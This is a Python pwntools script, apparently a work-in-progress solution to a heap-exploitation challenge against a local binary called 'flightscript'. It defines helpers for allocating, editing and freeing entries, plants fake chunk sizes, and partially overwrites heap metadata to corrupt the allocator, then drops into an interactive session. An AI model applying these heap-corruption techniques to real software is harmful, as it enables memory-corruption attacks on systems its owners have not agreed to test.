from pwn import *

exe = ELF("flightscript")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"

p = process([exe.path])
gdb.attach(p, gdbscript="""
b *newFS+155
b *delFS+113
b *editTag+153
""")

def newFS(size, label, save):
    p.sendlineafter(">> ", b"2")
    p.sendlineafter(">> ", str(size).encode())
    p.sendlineafter(">> ", label)
    p.sendlineafter(">> ", save)

def editTag(idx, label):
    p.sendlineafter(">> ", b"3")
    p.sendlineafter(">> ", str(idx).encode())
    p.sendlineafter(">> ", label)

def delFS(idx):
    p.sendlineafter(">> ", b"4")
    p.sendlineafter(">> ", str(idx).encode())

# for i in range(7):
#     newFS(0x40, b"A"*6, b"y")

# for i in range(7):
#     delFS(i)

# newFS(0x400, b"B"*6, b"y")

newFS(0x10, p64(0x20d51)[:7], b"y")
newFS(0x410, p64(0x20931)[:7], b"y")
newFS(0x10, p64(0x20911)[:7], b"y")

delFS(1)

editTag(0, b"\x18".ljust(7, b"\x00"))
newFS(0x10, b"AAAA", b"y")




p.interactive()